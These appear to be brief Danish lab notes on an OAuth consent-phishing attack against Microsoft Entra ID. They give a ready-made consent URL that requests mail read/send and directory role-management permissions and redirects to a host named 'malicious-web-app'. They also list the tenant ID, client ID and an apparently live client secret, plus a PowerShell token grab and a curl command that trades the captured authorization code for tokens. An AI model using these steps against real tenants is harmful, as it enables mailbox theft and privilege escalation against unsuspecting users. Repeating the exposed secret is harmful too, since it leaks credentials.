lavede en webapp i Entra ID (AzureAD) og tilføjede nogle lidt "farlige" delegated permissions til den.

https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback&scope=User.Read%20User.ReadWrite.All%20Mail.Read%20Mail.Send%20RoleManagement.ReadWrite.Directory&response_mode=query&prompt=consent

Tenant ID *(connection string)*
5dc7e152-c906-4d95-bd1a-bcf75eb3e939

Application (client) ID *(username)*
675c27b6-e1ff-4a2c-924e-701186f97951

client Secret (Malicious) *(password)*
eV68Q~WEECCIzSJKzATfkd2rly.Kxds1SFzNDbyg

Redirect URIs
https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback


`https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback&scope=User.ReadWrite&response_mode=query&prompt=consent`

**while connected in `Connect-AzAccount`**
$context = Get-AzContext

$token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token

Write-Output $token = eyJ0eXAiOiJKV1QiLCJub25jZSI6InJObkdLbVU0WmF3R0YwaWxOVk1nMDM0TUdVa2pjOFRIY001QXVhd2t0UEUiLCJhbGciOiJSUzI1...



```bash
curl -X POST "https://login.microsoftonline.com/YOUR_TENANT_ID/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=675c27b6-e1ff-4a2c-924e-701186f97951" \
  -d "client_secret=YOUR_CLIENT_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=AUTHORIZATION_CODE_FROM_URL" \
  -d "redirect_uri=https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback" \
  -d "scope=User.ReadWrite"
```